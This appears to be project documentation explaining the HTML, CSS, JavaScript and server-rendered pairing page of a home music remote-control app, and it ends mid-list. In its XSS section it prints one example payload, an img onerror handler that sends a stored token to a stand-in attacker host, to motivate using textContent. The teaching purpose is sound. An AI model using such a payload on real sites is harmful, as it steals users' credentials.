# 08 — `web/`: the web pages (and `pairing.py`)

**Files:**
[`web/index.html`](../../src/remote_music_control/web/index.html) (structure) ·
[`web/style.css`](../../src/remote_music_control/web/style.css) (appearance) ·
[`web/app.js`](../../src/remote_music_control/web/app.js) (behaviour) ·
[`web/pair.html`](../../src/remote_music_control/web/pair.html) + [`pairing.py`](../../src/remote_music_control/pairing.py) (pairing page)
**Depends on:** the HTTP API ([page 03](03-http-api.md)); nothing else — no framework, no npm, no build step
**Served by:** `api.py` at `/`, `/static/…` and `/pair`

## Where these files sit

```
 phone / Ubuntu browser                              studio PC
┌────────────────────────────────┐   GET /                 ┌────────────┐
│ index.html  ← structure        │ ◀────────────────────── │            │
│ style.css   ← appearance       │   GET /static/…         │  api.py    │
│ app.js      ← behaviour ───────┼──── GET /api/state ───▶ │            │
│                                │     every second        │            │
│                                │ ──── POST /api/next ──▶ │            │
└────────────────────────────────┘                         └────────────┘
```

The page is another **thin client**, like the CLI (page 05): it holds no media
logic, and everything it shows comes from `GET /api/state`. The browser
downloads three static files once; after that, only small JSON requests cross
the network.

**Why plain HTML, CSS and JavaScript** (ADR 0007): the page is one screen with
eight controls. A framework (React, Vue, Svelte) would bring Node.js, npm, a
bundler and a second toolchain to maintain, for a page this size. Without them,
you edit a file and reload the tab.

### The three languages of a web page

The split into three files is a classic **separation of concerns**:

| Language | Responsible for | File |
|---|---|---|
| **HTML** | What's on the page and what it means | `index.html` |
| **CSS** | What it looks like | `style.css` |
| **JavaScript** | What it does | `app.js` |

The browser parses the HTML into the **DOM** (Document Object Model): a tree of
objects — one per element — that CSS styles and JavaScript reads and changes.
When `app.js` sets `titleText.textContent = "..."`, it's changing a DOM node, and
the browser redraws that part of the screen.

---

# Part 1 — `index.html`: structure

## Block 1 — the document head

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  <title>Music</title>
  <link rel="stylesheet" href="/static/style.css">
  <script src="/static/app.js" defer></script>
</head>
```

- **`<!doctype html>`** tells the browser to use modern standards mode, not
  "quirks mode" (an emulation of 1990s browser bugs).
- **`lang="en"`** lets screen readers pronounce text correctly and browsers offer
  translation.
- **`charset="utf-8"`** — without it, a title like "花の専門店" could be displayed
  as garbage.
- **The viewport tag** is what makes the page work on phones. Without it, mobile
  browsers pretend to be a 980-pixel-wide desktop screen and shrink the page;
  with it, the page uses the phone's real width.
- **`color-scheme: light dark`** tells the browser the page supports both themes,
  so built-in elements (the slider, form fields, scrollbars) match.
- **`defer`** — the script downloads in parallel with the HTML but runs only
  after the whole document is parsed. So `document.getElementById("title")` in
  `app.js` always finds the element. Without `defer`, a script in `<head>` runs
  before the body exists.

## Block 2 — semantic elements and a state attribute

```html
<main id="player" class="player" data-status="connecting">
  <p id="banner" class="banner" role="alert" hidden></p>
  <form id="token-form" class="token-form" hidden>...</form>
  <section class="track" aria-live="polite">
    <p id="status" class="status">Connecting…</p>
    <h1 id="title" class="title">&nbsp;</h1>
    ...
```

**Semantic HTML** means choosing elements for what they *are*: `<main>` for the
page's main content, `<section>` for groups, `<h1>` for the most important
heading (the song title), `<button>` for things you press, `<form>` for input.
Browsers, search engines and **assistive technology** (screen readers) use that
meaning. A `<div>` styled to look like a button isn't reachable with the Tab key
and isn't announced as a button.

**`data-status="connecting"`** is a **custom data attribute**: any attribute
starting with `data-` is valid HTML and readable from JavaScript as
`element.dataset.status`. Here it holds the page's current state
(`connecting`, `playing`, `paused`, `stopped`, `none`, `locked`). JavaScript
changes this one attribute; CSS decides what each state looks like (Part 2,
Block 4). The two languages communicate through it without JavaScript touching
any styling.

**`hidden`** is a standard attribute that hides an element. The banner and the
token form start hidden; `app.js` shows them with `element.hidden = false`.

**Accessibility attributes (ARIA)** — *Accessible Rich Internet Applications*:

- **`aria-live="polite"`** on the track section: when its text changes (a new
  song), a screen reader announces it, without interrupting what it's reading.
- **`role="alert"`** on the banner: errors are announced immediately.
- **`aria-label`** gives a name to buttons that only contain an icon — "Next
  track" instead of nothing.
- **`aria-pressed`** on the mute button says whether it's currently on, making
  it a *toggle button* for assistive technology.

**`&nbsp;`** (non-breaking space) keeps the empty title and artist lines at
their normal height before the first state arrives, so the layout doesn't jump.

## Block 3 — buttons that declare their endpoint

```html
<button type="button" class="control" data-path="/api/previous" aria-label="Previous track">
  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M6 6h2v12H6zm3.5 6L18 6v12z"/></svg>
</button>
<button type="button" class="control primary" data-path="/api/play-pause" aria-label="Play or pause">
  <svg class="icon-play" ...><path d="M8 5v14l11-7z"/></svg>
  <svg class="icon-pause" ...><path d="M6 5h4v14H6zm8 0h4v14h-4z"/></svg>
</button>
```

- **`data-path="/api/next"`** — each button *declares* which API route it calls.
  `app.js` attaches one generic click handler to every element with
  `data-path` (Part 3, Block 9). Adding a button is HTML only. This is a
  **declarative** style: the markup says *what*, one piece of code does *how*
  — the same table-driven idea as the CLI's command table (page 05).
- **`type="button"`** — a `<button>` inside a form defaults to "submit". Being
  explicit prevents surprises.
- **Inline SVG icons.** SVG (Scalable Vector Graphics) describes shapes as
  paths: `M8 5v14l11-7z` means "move to (8,5), line down 14, line to the right
  and up, close" — a triangle. Written inline, the icons need no extra
  download, stay sharp at any size, and — with `fill: currentColor` in CSS —
  take the text colour, so they follow the dark theme automatically.
- **Both play *and* pause icons are in the HTML**; CSS shows the right one for
  the current state. Swapping visibility is simpler and faster than rebuilding
  the icon in JavaScript.
- **`aria-hidden="true"`** on the SVGs — the button's `aria-label` already names
  it; the drawing itself means nothing to a screen reader.

## Block 4 — the volume and the token form

```html
<div class="volume-slider">
  <input id="volume" type="range" min="0" max="100" step="1" value="0" aria-label="Volume level">
  <output id="volume-value" for="volume" class="volume-value">–</output>
</div>
<div class="volume-buttons">
  <button ... data-volume-path="/api/volume/down" aria-label="Volume down">−</button>
  <button type="button" id="mute" ... aria-pressed="false">...</button>
  <button ... data-volume-path="/api/volume/up" aria-label="Volume up">+</button>
</div>
```

- **`<input type="range">`** is the browser's native slider — keyboard and touch
  support for free. `min`, `max` and `step` mirror the API's 0–100 rule.
- **`<output for="volume">`** is the semantic element for "a value calculated
  from an input".
- **Two rows** (slider, then buttons): a Phase 3 test at 360 px width showed that
  four buttons beside the slider left it 20 px wide — unusable on a phone.

```html
<form id="token-form" class="token-form" hidden>
  <label for="token-input">Access token</label>
  <input id="token-input" type="password" autocomplete="off" spellcheck="false" required>
  <button type="submit">Connect</button>
</form>
```

- **`<label for=...>`** links the text to the input: tapping the label focuses
  the field, and screen readers read the label with it.
- **`type="password"`** hides the token on screen; **`autocomplete="off"`** and
  **`spellcheck="false"`** stop the browser from offering or underlining it.
- **A real `<form>`** means pressing Enter submits — expected keyboard behaviour
  without extra code.

---

# Part 2 — `style.css`: appearance

## Block 1 — design tokens and dark mode

```css
:root {
  --bg: #f4f3f1;
  --card: #ffffff;
  --text: #1c1b1a;
  --accent: #d93a2b;
  ...
}

@media (prefers-color-scheme: dark) {
  :root {
    --bg: #121212;
    --card: #1e1e1e;
    --accent: #ff4e45;
    ...
  }
}
```

**CSS custom properties** (often called CSS variables) are defined with `--name`
and used with `var(--name)`. `:root` is the top of the document, so they're
available everywhere. Every colour in the file comes from one of these.

**Dark mode is one media query**: `prefers-color-scheme: dark` matches when the
phone or computer is set to a dark theme, and it only **redefines the
variables**. No other rule needs a dark version. Named, reusable design values
like these are called **design tokens** in design systems.

**Colour contrast:** the dark theme's accent is a brighter red (`#ff4e45`) and
its text on the accent is dark, because the light theme's combination would be
hard to read on a dark background.

## Block 2 — defaults that make sizes predictable

```css
* {
  box-sizing: border-box;
}

[hidden] {
  display: none !important;
}
```

- **`box-sizing: border-box`** makes `width` include padding and border. By
  default, a `width: 100%` element with padding is *wider* than its container —
  a classic source of overflowing layouts. Setting this on everything is a
  near-universal CSS reset.
- **`[hidden]` with `!important`**: the `hidden` attribute is only a default
  style, so any rule like `.token-form { display: flex }` would override it and
  show the "hidden" form. `!important` makes `hidden` always win. (`!important`
  is usually a smell; here it restores what the attribute is supposed to mean.)

## Block 3 — layout: flexbox, and a bug worth remembering

```css
body {
  min-height: 100vh;
  min-height: 100dvh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 1rem;
}

.player {
  width: 100%;
  max-width: 26rem;
}
```

**Centering the card** uses **flexbox**: the body becomes a flex container,
`justify-content` centres horizontally, `align-items` vertically.

**`100vh` then `100dvh`**: `vh` is a percentage of the viewport height, but on
phones the browser's address bar makes `100vh` taller than what's visible.
`dvh` (*dynamic* viewport height) accounts for it. Older browsers that don't know
`dvh` ignore that line and keep `100vh` — writing the fallback first is called
**progressive enhancement**.

**`width: 100%; max-width: 26rem`**: fill narrow screens, stop growing on wide
ones. **`rem`** is relative to the root font size, so the layout scales if the
user enlarges text.

**The bug (Phase 3):** the first version centred with CSS grid,
`place-items: center`, which looks equivalent. At 360 px wide the card
overflowed the screen. In that grid, the card's `width: 100%` was measured
against a column whose size came from the card's own content — a circular
definition the browser resolved by using the content's width. Flexbox measures
the percentage against the real container. It was found only by rendering the
page in headless Chrome at phone widths; the explanation is kept in a comment
so nobody "simplifies" it back.

## Block 4 — styles driven by state

```css
.icon-pause,
.player[data-status="playing"] .icon-play {
  display: none;
}

.player[data-status="playing"] .icon-pause {
  display: block;
}

.player[data-status="locked"] .track,
.player[data-status="locked"] .transport,
.player[data-status="locked"] .volume {
  display: none;
}

#mute[aria-pressed="true"] .icon-sound { display: none; }
#mute[aria-pressed="true"] .icon-muted { display: block; }
```

**Attribute selectors** (`[data-status="playing"]`) match elements by attribute
value. Combined with a **descendant selector** (a space), `.player[data-status=
"playing"] .icon-play` means "the play icon inside the player *while it's
playing*".

This is the other half of Part 1, Block 2: JavaScript sets **what state** the
page is in; CSS decides **what that state looks like**. JavaScript never hides an
icon or colours a label directly. Adding a new look for a state is a CSS change
only.

The mute button uses its **accessibility attribute** as the styling hook:
`aria-pressed="true"` both tells screen readers "on" and switches the icon — so
the visual state and the announced state can't disagree.

## Block 5 — touch, focus and text details

```css
.control {
  touch-action: manipulation;
  ...
}

.control:focus-visible,
input[type="range"]:focus-visible {
  outline: 3px solid var(--accent);
  outline-offset: 2px;
}

.control.small {
  width: 2.75rem;    /* ≈ 44px: the usual minimum comfortable touch target */
  height: 2.75rem;
}
```

- **`touch-action: manipulation`** removes the ~300 ms delay some mobile
  browsers add after a tap while they wait to see whether it's a double-tap zoom.
  Buttons react immediately.
- **`:focus-visible`** shows a clear outline when a control is focused **with
  the keyboard**, but not after a mouse click or tap. Removing focus outlines
  entirely — common for looks — makes a page unusable without a mouse.
- **44 px touch targets**: Apple's and Google's accessibility guidelines use
  about 44–48 px as the minimum size a finger hits reliably.
- **`overflow-wrap: anywhere`** on titles: a long title without spaces wraps
  instead of pushing the card wider than the screen.
- **`font-variant-numeric: tabular-nums`** on the volume number: all digits get
  the same width, so "9%" → "10%" doesn't make the text jiggle while dragging.
- **`min-width: 0`** on the slider: flex items refuse by default to shrink below
  their content's natural width; this lets the slider shrink on narrow phones.
- **`system-ui`** font stack: each device uses its own interface font (Segoe UI
  on Windows, Roboto on Android, San Francisco on Apple), so the page feels
  native and downloads no font.

---

# Part 3 — `app.js`: behaviour

## Block 1 — strict mode, constants and element lookups

```javascript
"use strict";

const POLL_INTERVAL_MS = 1000;
const VOLUME_INPUT_GRACE_MS = 1500;
const MESSAGE_DURATION_MS = 4000;
const TOKEN_STORAGE_KEY = "remote-music-control.token";

const player = document.getElementById("player");
const titleText = document.getElementById("title");
...
const controls = document.querySelectorAll(".control, #volume");
```

- **`"use strict"`** turns on JavaScript's **strict mode**, which turns silent
  mistakes into errors — most importantly, assigning to a misspelled variable
  throws instead of silently creating a global.
- **`const`** for values that are never reassigned, **`let`** for those that
  are. (`var`, the old keyword, has confusing scoping rules and isn't used.)
- **Units in names** (`_MS`): `1000` alone could be seconds or milliseconds.
- **Elements looked up once** at startup and kept in constants, instead of
  searching the DOM on every poll.
- **`querySelectorAll(".control, #volume")`** uses CSS selector syntax to find
  every control at once, for enabling and disabling them together.

## Block 2 — the token: fragment, `localStorage`, and a damaged link

```javascript
let token = null;

function loadToken() {
  const match = location.hash.match(/^#token=(.+)$/);
  if (match) {
    history.replaceState(null, "", location.pathname + location.search);
    try {
      saveToken(decodeURIComponent(match[1]));
      return;
    } catch {
      // A damaged link (e.g. a cut-off "%" escape): ignore it and fall back...
    }
  }
  try {
    token = localStorage.getItem(TOKEN_STORAGE_KEY);
  } catch {
    token = null;
  }
}
```

### The pairing link

A pairing link looks like `http://192.168.1.16:8000/#token=...`. Everything
after `#` is the **URL fragment**, and it has a special property: **browsers
never send it to the server.** It exists only inside the browser. So the token
in a pairing link can't appear in the server's log, a proxy's log, or a
`Referer` header — which is why the token travels there and not in a query
string like `?token=...`.

- **`location.hash`** is the fragment; the **regular expression**
  `/^#token=(.+)$/` checks its shape and captures everything after `token=`.
- **`decodeURIComponent`** reverses URL encoding (`%2D` → `-`).
- **`history.replaceState(...)`** changes the address bar **without reloading or
  adding a history entry** — the token disappears from the visible URL, from
  bookmarks made afterwards, and from anyone looking over your shoulder.

**The damaged-link fix (made while writing this page):** a cut-off QR scan
could produce `#token=%E0%A4%A`. `decodeURIComponent` throws on that, and
because this runs at startup, **the whole script stopped** — verified in
headless Chrome: the page stayed on "Connecting…" with the token form hidden and
no way forward. Now the address bar is cleaned first, the error is caught, and
the page falls back to a saved token or shows the form. A small instance of a
big rule: **code that handles external input — and a URL is external input —
must not let malformed input break everything else.**

### `localStorage`

**`localStorage`** is a small key–value store the browser keeps **per origin**
(scheme + host + port), surviving tab closes and restarts. The page saves the
token there once, so later visits skip pairing.

**The `try/catch` around it:** some browsers block storage in private modes, or
by user settings; accessing it then throws. The page then keeps the token in the
`token` variable for this visit only.

**The security trade-off** (ADR 0009): any script running on this origin could
read `localStorage`. That's why the page never inserts untrusted text as HTML
(Block 4) and the server sends a Content-Security-Policy allowing only its own
scripts (page 03). An `HttpOnly` cookie would hide the token from scripts, but
then the browser would send it automatically with requests other sites trigger
— the CSRF problem the header design avoids.

### The token form

```javascript
tokenForm.addEventListener("submit", (event) => {
  event.preventDefault();
  saveToken(tokenInput.value.trim());
  tokenInput.value = "";
  tokenForm.hidden = true;
  hideBanner();
  player.dataset.status = "connecting";
  schedulePoll(0);
});
```

- **`addEventListener("submit", ...)`** runs the function when the form is
  submitted (button or Enter). The browser's event system is how pages react to
  anything: clicks, typing, scrolling, the tab being hidden.
- **`event.preventDefault()`** cancels the browser's default action — for a
  form, sending it to the server and reloading the page.
- **`(event) => { ... }`** is an **arrow function**, a compact function syntax.
- The field is cleared right away, so the token doesn't sit in the input.

## Block 3 — `api()`: one function for every request

```javascript
class ApiError extends Error {
  constructor(status, message) {
    super(message);
    this.status = status;
  }
}

async function api(method, path, body) {
  const options = { method, headers: {} };
  if (token) {
    options.headers["Authorization"] = `Bearer ${token}`;
  }
  if (body !== undefined) {
    options.headers["Content-Type"] = "application/json";
    options.body = JSON.stringify(body);
  }

  const response = await fetch(path, options);

  if (!response.ok) {
    let detail = null;
    try {
      detail = (await response.json()).detail;
    } catch {
    }
    const message = typeof detail === "string" ? detail : `Server error (HTTP ${response.status})`;
    throw new ApiError(response.status, message);
  }
  return response.status === 204 ? null : response.json();
}
```

**Every request in the page goes through this function** — the same design as
the CLI's `request()` (page 05). The token header was added in Phase 5 by
changing this one place. A single point that all traffic passes through is
sometimes called a **choke point**; it's where cross-cutting concerns
(authentication, error handling) belong.

**`fetch`** is the browser's built-in HTTP function. It returns a **Promise** — an
object representing a result that will arrive later — and `await` waits for it,
exactly like `await` in Python (page 01). JavaScript in a browser runs on a
single thread with an **event loop**, so waiting never freezes the page.

**The most important `fetch` fact:** it **rejects (throws) only on network
failure** — server unreachable, Wi-Fi gone. An HTTP error such as 401 or 409 is
a *successful* fetch of an error response. So `response.ok` (true for 200–299)
must be checked explicitly. Forgetting this is one of the most common web bugs.

**A custom error class:** `ApiError extends Error` adds a `status` field, so
callers can tell "server said no" (`ApiError`, with a code) from "couldn't reach
the server" (any other error thrown by `fetch`). `super(message)` runs the parent
class's constructor.

**Details:**

- **`{ method, headers: {} }`** — `method` alone is **shorthand** for
  `method: method`.
- **Template literals** — `` `Bearer ${token}` `` — backtick strings with `${}`
  placeholders, like Python's f-strings.
- **`JSON.stringify`** turns an object into JSON text for the body.
- **`typeof detail === "string"`** — a 422's `detail` is a list; only use it as a
  message when it's text (the CLI does the same).
- **The relative path** (`"/api/state"`) — requests go to the same server that
  served the page, so no address is configured anywhere in the page.

## Block 4 — rendering the state safely

```javascript
function renderState(state) {
  const track = state.now_playing;
  const hasPlayer = track !== null;

  player.dataset.status = hasPlayer ? track.status : "none";
  setControlsEnabled(hasPlayer);

  if (hasPlayer) {
    statusLabel.textContent = STATUS_LABELS[track.status] ?? track.status;
    titleText.textContent = track.title;
    artistText.textContent = track.artist;
    albumText.textContent = track.album ?? "";
    document.title = `${STATUS_SYMBOLS[track.status] ?? ""} ${track.title} — ${track.artist}`;
    renderVolume(state);
  } else {
    ...
  }
}
```

### `textContent`, never `innerHTML` — preventing XSS

Track titles come **from the internet**: anyone can upload a video to YouTube
with any title. Imagine a title like:

```html
<img src=x onerror="fetch('https://evil.example/?t='+localStorage.getItem('remote-music-control.token'))">
```

With `titleText.innerHTML = track.title`, the browser would **parse that as
HTML**, try to load the image, fail, run the `onerror` code — and send your
token to the attacker. That's **cross-site scripting (XSS)**: getting a page to
run someone else's script.

`textContent` sets the text **as text**. The same title simply appears on screen
with its angle brackets. There is no way for text to become code. This one habit
removes the whole class of attack for this page, and the Content-Security-Policy
(page 03) is the second line of defence in case it's ever broken.

**`??`** — the **nullish coalescing** operator: `a ?? b` gives `b` only when
`a` is `null` or `undefined`. `track.album ?? ""` shows nothing for a missing
album. (Unlike `||`, it wouldn't replace legitimate values such as `0` or `""`.)

**`document.title`** — the browser tab shows "▶ Song — Artist", so you can see
what's playing without switching tabs.

**Rendering from scratch every time:** every poll redraws everything from the
server's answer. The page never *modifies* its idea of the state ("now it's
paused"); it only *displays* what the server says. This makes the page
**stateless with respect to the music**: it can't drift out of sync, and a
change made elsewhere (the CLI, the phone, the studio keyboard) appears within a
second.

## Block 5 — rendering the volume without fighting the user

```javascript
let lastMuted = false;
let lastVolumeInputAt = 0;

function renderVolume({ volume, muted }) {
  const userIsDragging = Date.now() - lastVolumeInputAt < VOLUME_INPUT_GRACE_MS;
  if (!userIsDragging) {
    volumeSlider.value = volume;
    volumeValue.textContent = `${volume}%`;
  }
  lastMuted = muted;
  muteButton.setAttribute("aria-pressed", String(muted));
  muteButton.setAttribute("aria-label", muted ? "Unmute" : "Mute");
}
```

**The problem it solves:** you drag the slider to 30. A poll that started a
moment earlier answers "volume 50" and moves the slider back under your finger.

**The rule:** for 1.5 s after the last slider movement, polls don't move the
slider. After that, the server's value wins again — so if the volume was changed
from somewhere else, the page still catches up.

**`{ volume, muted }`** in the parameter list is **destructuring**: the function
receives an object and pulls out those two properties. It works with the full
state *and* with a volume endpoint's answer, since both have them (duck typing,
page 05).

**`lastMuted`** is kept so the mute button knows what to send next: the
**opposite** of the current state.

## Block 6 — enabling controls and showing messages

```javascript
function setControlsEnabled(enabled) {
  for (const control of controls) {
    control.disabled = !enabled;
  }
}

function setConnected(connected) {
  if (connected) {
    if (banner.dataset.kind === "connection") hideBanner();
  } else {
    player.dataset.status = "connecting";
    statusLabel.textContent = "Offline";
    setControlsEnabled(false);
    showBanner("Can't reach the server — retrying…", "connection");
  }
}

function showBanner(text, kind) {
  clearTimeout(messageTimer);
  banner.textContent = text;
  banner.dataset.kind = kind;
  banner.hidden = false;
  if (kind === "message") {
    messageTimer = setTimeout(hideBanner, MESSAGE_DURATION_MS);
  }
}
```

- **Controls are disabled when they can't work** — no player, offline, locked —
  rather than letting you press a button that will fail. Disabled buttons also
  can't be focused or clicked, and CSS dims them.
- **Two kinds of banner:** a *message* (a 409, a rejected command) disappears
  after 4 s; the *connection* banner stays until the connection comes back, and
  only then is hidden — so a successful poll doesn't hide an unrelated message.
  `banner.dataset.kind` remembers which is showing.
- **`for (const x of list)`** iterates over the items (like Python's `for x in`).

## Block 7 — one place for errors

```javascript
function handleError(error) {
  if (error instanceof ApiError && error.status === 401) {
    showTokenForm(token ? "The server rejected the saved token." : null);
  } else if (error instanceof ApiError) {
    showBanner(error.message, "message");
  } else {
    setConnected(false);
  }
}
```

Every failed request, from any button or poll, ends here:

| Error | What the page does |
|---|---|
| 401 | Show the token form (with a message if a saved token was rejected) |
| Other API error (409, 422, 502…) | Show the server's explanation for 4 s |
| Not an `ApiError` (fetch threw) | Offline mode: disable controls, "retrying…" |

**Centralized error handling** again (page 03): the decision "what does the
user see for this failure" is made once, so every control behaves consistently.

## Block 8 — polling

```javascript
let pollTimer = null;

async function refresh() {
  try {
    renderState(await api("GET", "/api/state"));
    setConnected(true);
  } catch (error) {
    handleError(error);
  }
}

function schedulePoll(delayMs) {
  clearTimeout(pollTimer);
  pollTimer = setTimeout(async () => {
    await refresh();
    if (!document.hidden && player.dataset.status !== "locked") schedulePoll(POLL_INTERVAL_MS);
  }, delayMs);
}

document.addEventListener("visibilitychange", () => {
  if (document.hidden) {
    clearTimeout(pollTimer);
  } else if (player.dataset.status !== "locked") {
    schedulePoll(0);
  }
});
```

### Why polling

**Polling** means asking regularly: "what's the state now?". The alternatives
push changes from the server — **WebSocket** (a permanent two-way connection) or
**Server-Sent Events** (a one-way stream). They're faster to react but need
connection management and reconnection logic on both sides. One small request per
second on a home network costs almost nothing, and the worst-case delay for a
change made elsewhere is one second (ADR 0007).

### `setTimeout` chain, not `setInterval`

`setInterval(refresh, 1000)` would start a request every second **regardless of
whether the previous one finished**. If the server took 3 s to answer, requests
would pile up. Here each poll **schedules the next one only after it completes**,
so there's never more than one in flight. `clearTimeout` before every
`setTimeout` guarantees at most one pending timer, even when a button press asks
for an immediate refresh (`schedulePoll(0)`).

### The Page Visibility API

`document.hidden` is true when the tab is in the background or the phone screen
is off, and the `visibilitychange` event fires when that changes. The page
**stops polling while hidden** (saving phone battery and server work) and
refreshes **immediately** when you come back, so you never see stale state.

**No polling while locked:** without a valid token every poll would fail with
401; the token form restarts polling when you submit.

## Block 9 — buttons

```javascript
for (const button of document.querySelectorAll("[data-path]")) {
  button.addEventListener("click", async () => {
    try {
      await api("POST", button.dataset.path);
    } catch (error) {
      handleError(error);
      return;
    }
    schedulePoll(0);
  });
}
```

One loop gives every `data-path` button the same behaviour: send `POST` to its
declared path, then refresh immediately rather than waiting up to a second for
the next poll. `button.dataset.path` reads `data-path`; `data-volume-path` becomes
`dataset.volumePath` (dashes become camelCase).

Each handler **closes over its own `button`** — the arrow function remembers
which button it was created for (a closure, as in Python on page 03).

**The volume buttons** get their new volume straight from the response
(`renderVolume(await api("POST", ...))`), and the **mute button** sends the
opposite of `lastMuted`.

## Block 10 — the slider: coalescing requests

```javascript
let volumeRequestInFlight = false;
let pendingVolume = null;

volumeSlider.addEventListener("input", () => {
  lastVolumeInputAt = Date.now();
  volumeValue.textContent = `${volumeSlider.value}%`;
  pendingVolume = Number(volumeSlider.value);
  sendPendingVolume();
});

async function sendPendingVolume() {
  if (volumeRequestInFlight) return;
  volumeRequestInFlight = true;
  try {
    while (pendingVolume !== null) {
      const level = pendingVolume;
      pendingVolume = null;
      renderVolume(await api("PUT", "/api/volume", { level }));
    }
  } catch (error) {
    pendingVolume = null;
    handleError(error);
  } finally {
    volumeRequestInFlight = false;
  }
}
```

**The problem:** dragging a slider fires dozens of `input` events per second.
Sending a request for each would flood the server with positions that are
already out of date by the time they arrive.

**The solution — coalescing:**

1. Every movement updates the number on screen **immediately** (feels instant)
   and overwrites `pendingVolume` with the latest position.
2. If no request is running, start the loop; if one is, do nothing — the loop
   will pick up the newest value when it comes back.
3. The loop sends the latest pending value, waits for the answer, and repeats
   while a newer value arrived meanwhile.

So at most **one request is in flight**, the **final position is always sent**,
and intermediate positions are skipped. A fast drag from 10 to 90 might send
10, 47, 90 instead of eighty requests.

**How this differs from the similar techniques:**

| Technique | Sends | Here? |
|---|---|---|
| **Debounce** | Only after the input stops for a while | No — you'd hear nothing change until you stop dragging |
| **Throttle** | At most once per fixed time interval | Close, but the interval would be a guess |
| **Coalesce** | The latest value, as soon as the previous request finishes | Yes — adapts to however fast the network is |

**`finally`** runs whether the `try` succeeded or threw, so the "in flight" flag
is always cleared — otherwise one failure would block every future volume
change. **`{ level }`** is shorthand for `{ level: level }`.

## Block 11 — startup

```javascript
setControlsEnabled(false);
loadToken();
if (token) {
  schedulePoll(0);
} else {
  showTokenForm();
}
```

Controls start disabled (nothing is known yet), the token is loaded from the
link or storage, and the page either starts polling immediately or asks for a
token. Because the script was loaded with `defer`, all of this runs after the
HTML exists.

### The page's states

```
                ┌────────────── no token / 401 ───────────────┐
                ▼                                              │
           [locked] ── token submitted ──▶ [connecting] ──────┤
                                               │  poll ok      │
                                               ▼               │
              ┌──── fetch fails ──── [playing | paused | stopped | none]
              ▼                                ▲
          [connecting + "Offline"] ── poll ok ─┘
```

Each bracketed state is a value of `data-status`, and CSS styles each one. A
page organized around a small set of named states and the events that move
between them is a simple **state machine**.

---

# Part 4 — the pairing page: `pair.html` and `pairing.py`

The pairing page (ADR 0012) works differently from the player: it's built on the
**server**, not in the browser.

| | Player (`index.html`) | Pairing (`pair.html`) |
|---|---|---|
| HTML sent | The same static file to everyone | Generated per request |
| Data | Fetched by JavaScript afterwards | Filled in before sending |
| JavaScript | `app.js` | None |
| Name | **Client-side rendering** | **Server-side rendering** |

Server-side rendering fits here: the content (token, IP, MAC) must never be
available through an API a remote device could call, and a page with no
JavaScript at all has nothing to attack in the browser.

## Block 1 — the template

```html
<div class="qr">$ip_qr</div>
<p class="qr-caption">Uses this PC's address, <strong>$ip_address</strong>.</p>
...
<tr><th>MAC address</th><td><code>$mac_address</code></td></tr>
```

`$name` placeholders are filled by Python's **`string.Template`** (standard
library). Keeping the HTML in an `.html` file — not in Python strings — lets
editors highlight and check it, and keeps `pairing.py` about logic.

**`<details>` / `<summary>`** make the DHCP instructions a native collapsible
section: click the summary to open it. No JavaScript needed.

The page links `/static/style.css` and adds `class="document"` to `<body>`,
switching off the player's centred layout — a tall, scrolling page centred with
flexbox would have its top cut off on short screens.

## Block 2 — filling it safely

```python
def render_pairing_page(token: str, port: int, network: NetworkDetails) -> str:
    name_link = f"http://{network.hostname}.local:{port}/#token={token}"
    if network.ip_address:
        ip_link = f"http://{network.ip_address}:{port}/#token={token}"
        ip_qr = qr_code_svg(ip_link)
        ...
    values = {"hostname": network.hostname.upper(), "ip_address": ..., "mac_address": ..., ...}
    escaped = {key: html.escape(value) for key, value in values.items()}
    template = Template(TEMPLATE_PATH.read_text(encoding="utf-8"))
    return template.substitute(escaped, ip_qr=ip_qr, name_qr=qr_code_svg(name_link))
```

**`html.escape`** converts `<`, `>`, `&` and quotes into `&lt;`, `&gt;`,
`&amp;`… so a value is always displayed as text. It's the server-side equivalent
of `textContent`: a computer name can be set by anyone with admin rights, and
escaping at the moment of output means no value can inject markup. The rule is
**escape on output, for the context you're writing into** (here, HTML). A test
feeds a hostname of `<script>x</script>` and checks it comes out escaped.

**The QR codes are the one exception**: they're `<svg>` markup generated by
`segno` from the link — our own output, not outside input — so they're inserted
as-is.

**`template.substitute(...)`** raises an error if any `$placeholder` is left
without a value — a typo in the template fails loudly instead of showing
`$ip_adress` on the page.

## Block 3 — QR codes and network details

```python
def qr_code_svg(text: str) -> str:
    return segno.make(text, error="m").svg_inline(scale=5, border=4, dark="#000000", light="#ffffff")
```

- **Error correction level M** — QR codes contain redundant data so they still
  scan when partly unreadable (glare on a monitor, a finger in the way). Level M
  recovers from about 15% damage while keeping the code small.
- **Explicit black on white, with a border (the "quiet zone")** — phone scanners
  need dark modules on a light background and blank space around the code. The
  page's dark theme must not invert the QR code, so the colours are fixed.
- **Inline SVG** — no image file, no extra request, sharp at any size, and
  allowed by the Content-Security-Policy (an external QR image service would
  also have received the token).

The rest of `pairing.py` gathers network details:

- **`lan_ip_address()`** "connects" a UDP socket to a reserved documentation
  address. No packet is sent — UDP has no connection handshake — but the
  operating system picks the network interface it *would* use, and
  `getsockname()` reveals its IP. A standard trick to find "my LAN address"
  without guessing among several interfaces.
- **`mac_address_of(ip)`** uses `psutil.net_if_addrs()` to find the network card
  holding that IP and returns its hardware (MAC) address — what the router needs
  for a DHCP reservation. Windows reports it with dashes and lowercase; it's
  normalized to the usual `AA:BB:CC:DD:EE:FF`.
- **`router_address_guess(ip)`** — home routers are almost always `x.x.x.1`.
  Called a guess in the page, because it is one (it matched the studio PC's real
  gateway).

---

## How the pages are tested

**No JavaScript unit tests.** They would need Node.js and a JavaScript test
runner — the second toolchain ADR 0007 chose to avoid. What exists instead:

- **The API the page uses is fully tested** in Python (page 09), so the page's
  requests get correct answers and errors.
- **Headless Chrome checks during development**: loading the page with
  `--dump-dom` to confirm the JavaScript ran (`data-status`, rendered title),
  screenshots at 320/390/412/1000 px widths and in both themes, the token form
  for missing, wrong and **damaged** links.
- **Real devices**: the Ubuntu browser and your Samsung phone (pairing by QR
  code, controls), recorded in the manual checklist.
- **Pairing page content** is tested in Python (`tests/unit/test_pairing.py`,
  escaping included), and its access rules in `tests/integration/test_api.py`.

## Known limitations

- **No JavaScript tests** — a change to `app.js` is verified by hand.
- **Pressing "next" repeatedly during a slow skip** sends several commands; the
  button isn't disabled while one is in flight. Usually what you want; sometimes
  one skip more than intended.
- **Offline retries every second** without backing off. Harmless on a home
  network; a public service would slow down retries.
- **The token lives in `localStorage`**, readable by any script on the page —
